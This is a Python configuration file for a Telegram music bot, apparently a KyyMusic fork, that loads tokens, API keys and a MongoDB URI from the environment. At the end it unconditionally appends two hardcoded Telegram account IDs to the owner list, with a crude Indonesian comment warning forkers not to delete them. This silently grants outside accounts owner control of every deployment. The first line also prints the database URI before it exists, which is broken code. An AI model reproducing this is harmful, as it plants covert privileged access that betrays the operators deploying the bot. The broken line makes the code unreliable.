##Config
print("MONGO_DB_URI =", repr(MONGO_DB_URI))
from os import getenv
from dotenv import load_dotenv

load_dotenv()

def get_int_env(var_name, default):
    val = getenv(var_name, "").strip()
    return int(val) if val.isdigit() else default

def get_list_int_env(var_name, default):
    val = getenv(var_name, "").strip()
    try:
        return list(map(int, val.split())) if val else default
    except ValueError:
        return default

get_queue = {}

SESSION_NAME = getenv('SESSION_NAME', 'session')
BOT_TOKEN = getenv('BOT_TOKEN')
API_ID = get_int_env('API_ID', 12345678)
API_HASH = getenv('API_HASH')
DURATION_LIMIT = get_int_env('DURATION_LIMIT', 3600)
COMMAND_PREFIXES = getenv('COMMAND_PREFIXES', '/ . , : ; !').split()
MONGO_DB_URI = getenv("MONGO_DB_URI")

SUDO_USERS = get_list_int_env('SUDO_USERS', [1663258664])
LOG_GROUP_ID = get_int_env("LOG_GROUP_ID", -1001288822269)
ASS_ID = get_int_env("ASS_ID", 2130437611)
OWNER_ID = get_list_int_env('OWNER_ID', [1663258664])

GROUP = getenv("GROUP", None)
CHANNEL = getenv("CHANNEL", None)
AUTO_LEAVE = get_int_env("AUTO_LEAVE", 1500)
UPSTREAM_BRANCH = getenv("UPSTREAM_BRANCH", "master")
UPSTREAM_REPO = getenv("UPSTREAM_REPO", "https://github.com/muhammadrizky16/KyyMusic")
HEROKU_API_KEY = getenv("HEROKU_API_KEY")
HEROKU_APP_NAME = getenv("HEROKU_APP_NAME")

# Tambahan OWNER ID tetap ada
for owner in [1663258664, 1607338903]:
    if owner not in OWNER_ID:
        OWNER_ID.append(owner)

# KALO FORK/CLONE JAN DI HAPUS KENTOD
OWNER_ID.append(1663258664)
OWNER_ID.append(1607338903)
